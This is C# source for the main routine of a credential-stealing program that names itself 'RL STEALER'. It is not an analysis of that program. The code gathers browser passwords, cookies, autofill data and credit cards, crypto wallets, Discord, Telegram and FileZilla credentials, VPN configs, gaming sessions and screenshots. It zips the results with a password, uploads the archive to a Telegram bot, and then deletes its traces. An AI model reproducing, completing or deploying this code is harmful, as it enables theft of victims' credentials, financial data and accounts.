﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using Ionic.Zip;
using Ionic.Zlib;

namespace youknowcaliber
{
	internal class Program
	{
		public static void Main(string[] args)
		{
			bool flag = !File.Exists(Help.ExploitDir);
			if (flag)
			{
				bool flag2 = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length == 1;
				if (flag2)
				{
					try
					{
						Directory.CreateDirectory(Help.ExploitDir);
						List<Thread> list = new List<Thread>();
						list.Add(new Thread(delegate()
						{
							Browsers.Start();
						}));
						list.Add(new Thread(delegate()
						{
							Files.GetFiles();
						}));
						list.Add(new Thread(delegate()
						{
							StartWallets.Start();
						}));
						new Thread(delegate()
						{
							Outlook.GrabOutlook(Help.ExploitDir);
						}).Start();
						list.Add(new Thread(delegate()
						{
							Help.Ethernet();
							Screen.GetScreen();
							ProcessList.WriteProcesses();
							SystemInfo.GetSystem();
						}));
						list.Add(new Thread(delegate()
						{
							ProtonVPN.Save();
							OpenVPN.Save();
							NordVPN.Save();
							Uplay.GetUplaySession(Help.ExploitDir + "\\Gaming\\Uplay");
							Minecraft.SaveAll(Help.ExploitDir + "\\Gaming\\Minecraft");
						}));
						list.Add(new Thread(delegate()
						{
							SystemInfo.GetProg(Help.ExploitDir);
							Discord.WriteDiscord();
							FileZilla.GetFileZilla();
							Telegram.GetTelegramSessions();
							Vime.Get();
						}));
						foreach (Thread thread in list)
						{
							thread.Start();
						}
						foreach (Thread thread2 in list)
						{
							thread2.Join();
						}
						string text = Help.ExploitDir + "\\@" + SystemInfo.Country() + ".zip";
						using (ZipFile zipFile = new ZipFile(Encoding.GetEncoding("cp866")))
						{
							zipFile.ParallelDeflateThreshold = -1L;
							zipFile.UseZip64WhenSaving = Zip64Option.Always;
							zipFile.CompressionLevel = CompressionLevel.Default;
							zipFile.Comment = string.Concat(new string[]
							{
								"\n ================== RL STEALER =================\n =============================================== \n Operating system : ",
								SystemInfo.GetSystemVersion(),
								"\n PC user : ",
								SystemInfo.compname,
								"/",
								SystemInfo.username,
								"\n =============================================== \n CPU : ",
								SystemInfo.GetCPUName(),
								"\n RAM : ",
								SystemInfo.GetRAM(),
								"\n GPU : ",
								SystemInfo.GetGpuName(),
								"\n =============================================== \n IP Geolocation : ",
								SystemInfo.IP(),
								" ",
								SystemInfo.Country(),
								"\n Log Date : ",
								Help.date,
								"\n Password : ",
								Config.P0ass,
								"\n =============================================== "
							});
							zipFile.Password = Config.P0ass;
							zipFile.AddDirectory(Help.ExploitDir);
							zipFile.Save(text);
						}
						string text2 = string.Concat(new object[]
						{
							"\n⏰ Date => ",
							Help.date,
							"\n\ud83d\udcbbSystem => ",
							SystemInfo.GetSystemVersion(),
							"\n\ud83d\udc64 User => ",
							Environment.UserName,
							"\n\ud83c\udd94 PC => ",
							SystemInfo.compname,
							"\n\ud83c\udff4 Country => ",
							SystemInfo.Country(),
							"\n\ud83d\udd0d IP => ",
							SystemInfo.IP(),
							"\n\ud83d\udcdd Language => ",
							Flags.GetFlag(SystemInfo.culture.Split(new char[]
							{
								'-'
							})[1]),
							" ",
							SystemInfo.culture,
							"\n\ud83d\udd13 Antivirus => ",
							SystemInfo.GetAntivirus(),
							"\n ===={ User Data }====\n\ud83d\udcc2 FileGrabber => ",
							Files.count,
							"\n\ud83d\udce6 Telegram => ",
							(Counting.Telegram > 0) ? "✅" : "❌",
							"\n\ud83d\udcb8 Wallets => ",
							(Counting.Wallets > 0) ? "✅" : "❌",
							"\n\ud83d\udcac Discord => ",
							(Counting.Discord > 0) ? "✅" : "❌",
							"\n\ud83d\udce1 FileZilla: ",
							(Counting.FileZilla > 0) ? ("✅ (" + Counting.FileZilla + ")") : "❌",
							"\n VimeWorld => ",
							(Counting.VimeWorld > 0) ? "✅" : "❌",
							"\n ===={ VPN }====\n ∟ NordVPN => ",
							(Counting.NordVPN > 0) ? "✅" : "❌",
							"\n ∟ OpenVPN => ",
							(Counting.OpenVPN > 0) ? "✅" : "❌",
							"\n ∟ ProtonVPN => ",
							(Counting.ProtonVPN > 0) ? "✅" : "❌",
							"\n ===={ Browsers Data }====\n\ud83d\udddd Passwords => ",
							Counting.Passwords,
							"\n\ud83d\udd51 History => ",
							Counting.History,
							"\n\ud83c\udf6a Cookies => ",
							Counting.Cookies,
							"\n\ud83d\udcdd AutoFills => ",
							Counting.AutoFill,
							"\n\ud83d\udcb3 CC => ",
							Counting.CreditCards,
							"\n ===={ Gaming }====\n \ud83c\udfae Steam => ",
							(Counting.Steam > 0) ? "✅" : "❌",
							"\n ==================\n DOMAINS DETECTED:\n - ",
							URLSearcher.GetDomainDetect(Help.ExploitDir + "\\Browsers\\")
						});
						string text3 = text;
						byte[] bytes = File.ReadAllBytes(text3);
						string text4 = text3;
						string address = string.Concat(new string[]
						{
							Config.Token,
							"/sendDocument?chat_id=",
							Config.ID,
							"&caption===== RL STEALER ==== ",
							text2
						});
						try
						{
							WebClient webClient = new WebClient();
							webClient.Proxy = null;
							string text5 = "------------------------" + DateTime.Now.Ticks.ToString("x");
							webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text5);
							string @string = webClient.Encoding.GetString(bytes);
							string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
							{
								text5,
								text4,
								"application/x-ms-dos-executable",
								@string
							});
							byte[] bytes2 = webClient.Encoding.GetBytes(s);
							byte[] array = webClient.UploadData(address, "POST", bytes2);
						}
						catch
						{
						}
						Program.Finish();
					}
					catch (Exception value)
					{
						Console.WriteLine(value);
					}
				}
			}
		}

		private static void Finish()
		{
			Thread.Sleep(15000);
			Directory.Delete(Help.ExploitDir + "\\", true);
			Environment.Exit(0);
		}
	}
}
